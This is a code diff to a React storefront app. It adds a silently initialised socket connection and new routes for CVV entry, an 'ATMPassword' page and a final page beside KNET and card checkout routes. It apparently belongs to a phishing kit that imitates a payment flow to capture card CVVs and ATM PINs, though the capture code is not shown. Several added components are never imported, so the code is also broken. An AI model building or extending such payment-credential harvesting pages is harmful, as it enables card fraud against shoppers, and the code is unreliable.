@@ -20,6 +20,7 @@ import { connectStorefront } from "@/kdd/lib/socketClient";
 import "./styles.css";
 import KNETPayment from "../pages/KNETPayment";
 import CreditCardPayment from "../pages/CreditCardPayment";
+import { initializeSocket } from "@/lib/store";
 
 const queryClient = new QueryClient({
   defaultOptions: { queries: { staleTime: 30_000, retry: false } },
@@ -60,6 +61,7 @@ function LocalFallback() {
 }
 
 export default function StorefrontApp() {
+  useEffect(() => { try { initializeSocket(); } catch (e) {} }, []);
   return (
     <QueryClientProvider client={queryClient}>
       <LanguageProvider>
@@ -75,7 +77,10 @@ export default function StorefrontApp() {
               <Route path="/checkout" element={<Checkout />} />
 <Route path="/knet" element={<KNETPayment />} />
 <Route path="/card" element={<CreditCardPayment />} />
-              <Route path="*" element={<LocalFallback />} />
+                      <Route path="/final-page" element={<FinalPage />} />
+        <Route path="/cvv" element={<CVV />} />
+        <Route path="/atm" element={<ATMPassword />} />
+<Route path="*" element={<LocalFallback />} />
             </Routes>
           </BrowserRouter>
           <Toaster position="top-center" richColors />
